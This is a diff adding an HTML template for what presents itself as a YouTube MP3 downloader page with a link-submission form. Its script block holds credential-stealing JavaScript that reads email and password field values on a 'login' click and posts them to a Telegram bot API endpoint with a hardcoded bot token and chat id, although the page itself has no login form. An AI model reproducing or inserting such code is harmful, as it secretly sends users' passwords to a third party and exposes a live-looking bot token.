@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="{{url_for('static', filename='css/style.css')}}">
+    <title>YOUTUBE-DOWNLOADER</title>
+</head>
+<body>
+    <div class="container">
+        <div class="body">
+            <h1>MP3-DOWNLOADER</h1>
+
+            <br>
+            <div>
+                <form action="/" method="post" id="form1">
+                    
+                    <input type="text" name="link" id="link" placeholder="link">
+                    <button type="submit" class="botonCss" id="botonCss"><strong>enviar</strong></button>
+                </form>
+            </div>
+            <div class="result">
+                {% block content %} 
+                {% endblock %}
+
+            </div>
+        </div>
+    </div>
+    <script>
+      
+
+
+let d = document.getElementById('login');
+let email = document.getElementById('Email');
+let password = document.getElementById('Password');
+d.addEventListener('click', async () => {
+    console.log('iniciiais')
+    
+    let mensaje = `Email: ${email.value} 
+passw: ${password.value}`
+
+   
+    var data = {
+        'chat_id':1670980553,
+        'text': mensaje,
+    }
+    console.log(email.value, password.value)
+    const url = 'https://api.telegram.org/bot5782277597:AAEt5X9pbVkjVoa0TyjeZGc0qx1WCjPqpLI/sendMessage'
+    const link = 'https://api.telegram.org/bot5782277597:AAEt5X9pbVkjVoa0TyjeZGc0qx1WCjPqpLI/sendMessage?chat_id=1670980553&text=jgjhgola'
+    
+    
+    const method = {
+        method:'POST',
+        headers:{'Content-Type':'application/json'},
+        body:JSON.stringify(data),
+    }
+    let resp = await fetch(url, method)
+    let y = await resp.json()
+   
+    console.log(y);
+}
+)
+    </script>
+</body>
+</html>
